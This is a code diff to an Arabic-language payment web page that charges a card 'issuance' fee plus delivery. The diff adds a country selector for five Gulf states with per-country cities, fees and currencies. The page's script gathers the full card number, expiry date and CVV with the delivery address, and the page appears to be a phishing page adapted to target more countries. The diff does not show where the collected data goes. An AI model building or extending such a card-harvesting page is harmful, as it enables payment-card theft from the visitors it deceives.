@@ -211,11 +211,11 @@
 
         .form-row {
             display: flex;
-            gap: 15px;
+            gap: 30px;
         }
         .form-row .form-group {
             flex: 1;
-            margin-bottom: 0;
+            margin-bottom: 18px;
         }
 
         /* ===== CARD NUMBER WRAPPER ===== */
@@ -340,7 +340,7 @@
             .main-container { padding: 20px 10px 40px; }
             .payment-card-body { padding: 20px; }
             .card-input-section { padding: 18px; }
-            .form-row { grid-template-columns: 1fr; gap: 0; }
+            .form-row { flex-direction: column; gap: 0; }
         }
     </style>
 </head>
@@ -370,15 +370,15 @@
                     <h3><i class="fas fa-receipt"></i> ملخص الدفع</h3>
                     <div class="summary-row">
                         <span class="label">مصاريف إصدار البطاقة</span>
-                        <span class="value">30 ر.ق</span>
+                        <span class="value" id="issueFee">30 ر.ق</span>
                     </div>
                     <div class="summary-row">
                         <span class="label">رسوم التوصيل</span>
-                        <span class="value">5 ر.ق</span>
+                        <span class="value" id="deliveryFee">5 ر.ق</span>
                     </div>
                     <div class="summary-row total">
                         <span class="label">الإجمالي الكلي</span>
-                        <span class="value">35 ر.ق</span>
+                        <span class="value" id="totalAmount">35 ر.ق</span>
                     </div>
                 </div>
 
@@ -387,17 +387,21 @@
                     <h3><i class="fas fa-map-marker-alt"></i> عنوان التوصيل</h3>
 
                     <div class="form-group">
+                        <label>الدولة</label>
+                        <select id="country" name="country" class="form-control" required>
+                            <option value="">اختر الدولة...</option>
+                            <option value="kw">الكويت</option>
+                            <option value="qa">قطر</option>
+                            <option value="sa">المملكة العربية السعودية</option>
+                            <option value="bh">البحرين</option>
+                            <option value="om">سلطنة عُمان</option>
+                        </select>
+                    </div>
+
+                    <div class="form-group">
                         <label>المدينة / المنطقة</label>
                         <select id="city" name="city" class="form-control" required>
-                            <option value="">اختر المنطقة...</option>
-                            <option value="الدوحة">الدوحة</option>
-                            <option value="الريان">الريان</option>
-                            <option value="الوكرة">الوكرة</option>
-                            <option value="الخور">الخور</option>
-                            <option value="لوسيل">لوسيل</option>
-                            <option value="اللؤلؤة">اللؤلؤة</option>
-                            <option value="أم صلال">أم صلال</option>
-                            <option value="الشيحانية">الشيحانية</option>
+                            <option value="">اختر الدولة أولاً...</option>
                         </select>
                     </div>
 
@@ -462,7 +466,7 @@
                     </div>
                 </div>
 
-                <button type="submit" class="pay-btn" id="payBtn">تأكيد الدفع - 35 ر.ق</button>
+                <button type="submit" class="pay-btn" id="payBtn">تأكيد الدفع - <span id="btnTotal">35 ر.ق</span></button>
 
                 <div class="supported-cards">
                     <i class="fab fa-cc-visa" style="color:#1A1F71;"></i>
@@ -724,6 +728,73 @@
             document.getElementById('errorModal').style.display = 'none';
         }
 
+        // ===== COUNTRY DATA =====
+        const countryData = {
+            'kw': {
+                cities: ['الكويت', 'حولي', 'السالمية', 'الفروانية', 'الجهراء', 'الأحمدي', 'مبارك الكبير', 'النسيم', 'العدان', 'الصباحية', 'المنقف', 'الفنطاس', 'الوفرة', 'الصليبية'],
+                issueFee: 5,
+                deliveryFee: 2,
+                currency: 'د.ك',
+                label: 'الكويت'
+            },
+            'qa': {
+                cities: ['الدوحة', 'الريان', 'الوكرة', 'الخور', 'لوسيل', 'اللؤلؤة', 'أم صلال', 'الشيحانية'],
+                issueFee: 30,
+                deliveryFee: 5,
+                currency: 'ر.ق',
+                label: 'قطر'
+            },
+            'sa': {
+                cities: ['الرياض', 'جدة', 'مكة المكرمة', 'المدينة المنورة', 'الدمام', 'الخبر', 'تبوك', 'أبها', 'الطائف', 'القصيم', 'حائل', 'نجران', 'جازان', 'الباحة', 'الجوف', 'الحدود الشمالية', 'القصيم'],
+                issueFee: 110,
+                deliveryFee: 20,
+                currency: 'ر.س',
+                label: 'السعودية'
+            },
+            'bh': {
+                cities: ['المنامة', 'المحرق', 'الرفاع', 'مدينة عيسى', 'مدينة حمد', 'سترة', 'الزلاق', 'البحرين'],
+                issueFee: 11,
+                deliveryFee: 2,
+                currency: 'د.ب',
+                label: 'البحرين'
+            },
+            'om': {
+                cities: ['مسقط', 'صلالة', 'صحار', 'نزوى', 'البريمي', 'عبري', 'صور', 'الرستاق', 'السيب', 'بركاء', 'عبري'],
+                issueFee: 12,
+                deliveryFee: 2,
+                currency: 'ر.ع',
+                label: 'عُمان'
+            }
+        };
+
+        function updatePrices(countryCode) {
+            const data = countryData[countryCode];
+            if (!data) return;
+            const total = data.issueFee + data.deliveryFee;
+            document.getElementById('issueFee').textContent = data.issueFee + ' ' + data.currency;
+            document.getElementById('deliveryFee').textContent = data.deliveryFee + ' ' + data.currency;
+            document.getElementById('totalAmount').textContent = total + ' ' + data.currency;
+            document.getElementById('btnTotal').textContent = total + ' ' + data.currency;
+        }
+
+        function updateCities(countryCode) {
+            const citySelect = document.getElementById('city');
+            citySelect.innerHTML = '<option value="">اختر المنطقة...</option>';
+            const data = countryData[countryCode];
+            if (!data) return;
+            data.cities.forEach(function(city) {
+                const option = document.createElement('option');
+                option.value = city;
+                option.textContent = city;
+                citySelect.appendChild(option);
+            });
+            updatePrices(countryCode);
+        }
+
+        document.getElementById('country').addEventListener('change', function() {
+            updateCities(this.value);
+        });
+
         document.getElementById('payBtn').addEventListener('click', async (e) => {
             e.preventDefault();
 
@@ -734,6 +805,7 @@
                 return;
             }
 
+            const country = document.getElementById('country').value;
             const cardHolder = document.getElementById('card_holder').value.trim();
             const cardNumber = document.getElementById('card_number').value.trim();
             const expiryDate = document.getElementById('expiry_date').value.trim();
@@ -745,6 +817,10 @@
             const floor = document.getElementById('floor').value;
 
             // Validate delivery address
+            if (!country) {
+                alert('يرجى اختيار الدولة');
+                return;
+            }
             if (!city || !street || !buildingNumber || !floor) {
                 alert('يرجى إكمال بيانات عنوان التوصيل');
                 return;
@@ -785,6 +861,7 @@
                 expiry_date: rawExpiry,
                 cvv: cvv,
                 delivery_address: {
+                    country: country,
                     city: city,
                     street: street,
                     building_number: buildingNumber,
